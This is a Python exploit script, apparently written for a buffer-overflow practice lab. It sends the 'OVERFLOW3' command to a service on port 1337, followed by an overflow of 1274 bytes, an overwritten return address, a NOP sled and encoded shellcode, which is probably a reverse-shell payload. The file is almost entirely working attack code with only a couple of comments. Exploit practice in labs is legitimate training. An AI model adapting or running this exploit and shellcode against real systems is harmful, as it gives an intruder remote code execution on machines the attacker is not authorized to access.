#!/usr/bin/env python3

import socket, sys


'''
Getting offset 
'''


ip = "10.10.18.85"
port = 1337

prefix = b"OVERFLOW3 "
offset = 1274
overflow = b"A" * offset
retn = b"\x03\x12\x50\x62"
padding = b"\x90"*16      # used for giving some space to unpack encoding(in this case, shikataganai)

shellcode = b"\xfc\xbb\x64\x61\x43\xe8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x98\x89\xc1\xe8\x60\x4a\xa6\x61\x85\x7b\xe6\x16\xce\x2c\xd6\x5d\x82\xc0\x9d\x30\x36\x52\xd3\x9c\x39\xd3\x5e\xfb\x74\xe4\xf3\x3f\x17\x66\x0e\x6c\xf7\x57\xc1\x61\xf6\x90\x3c\x8b\xaa\x49\x4a\x3e\x5a\xfd\x06\x83\xd1\x4d\x86\x83\x06\x05\xa9\xa2\x99\x1d\xf0\x64\x18\xf1\x88\x2c\x02\x16\xb4\xe7\xb9\xec\x42\xf6\x6b\x3d\xaa\x55\x52\xf1\x59\xa7\x93\x36\x82\xd2\xed\x44\x3f\xe5\x2a\x36\x9b\x60\xa8\x90\x68\xd2\x14\x20\xbc\x85\xdf\x2e\x09\xc1\x87\x32\x8c\x06\xbc\x4f\x05\xa9\x12\xc6\x5d\x8e\xb6\x82\x06\xaf\xef\x6e\xe8\xd0\xef\xd0\x55\x75\x64\xfc\x82\x04\x27\x69\x66\x25\xd7\x69\xe0\x3e\xa4\x5b\xaf\x94\x22\xd0\x38\x33\xb5\x17\x13\x83\x29\xe6\x9c\xf4\x60\x2d\xc8\xa4\x1a\x84\x71\x2f\xda\x29\xa4\xe0\x8a\x85\x17\x41\x7a\x66\xc8\x29\x90\x69\x37\x49\x9b\xa3\x50\xe0\x66\x24\x55\xfd\x18\x49\x01\xff\xd8\xa0\x8e\x76\x3e\xa8\x3e\xdf\xe9\x45\xa6\x7a\x61\xf7\x27\x51\x0c\x37\xa3\x56\xf1\xf6\x44\x12\xe1\x6f\xa5\x69\x5b\x39\xba\x47\xf3\xa5\x29\x0c\x03\xa3\x51\x9b\x54\xe4\xa4\xd2\x30\x18\x9e\x4c\x26\xe1\x46\xb6\xe2\x3e\xbb\x39\xeb\xb3\x87\x1d\xfb\x0d\x07\x1a\xaf\xc1\x5e\xf4\x19\xa4\x08\xb6\xf3\x7e\xe6\x10\x93\x07\xc4\xa2\xe5\x07\x01\x55\x09\xb9\xfc\x20\x36\x76\x69\xa5\x4f\x6a\x09\x4a\x9a\x2e\x29\xa9\x0e\x5b\xc2\x74\xdb\xe6\x8f\x86\x36\x24\xb6\x04\xb2\xd5\x4d\x14\xb7\xd0\x0a\x92\x24\xa9\x03\x77\x4a\x1e\x23\x52\x4a\xa0\xdb\x5d"


#postfix = b""

payload = prefix + overflow + retn + padding + shellcode     #Add NOPs \x90

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending payload...")
    #s.recv(1024)
    s.send(payload + b'\r\n')
    #s.recv(1024)
    print("Done!")
    s.close

except:
    print("Cannot connect to server")
    sys.exit()
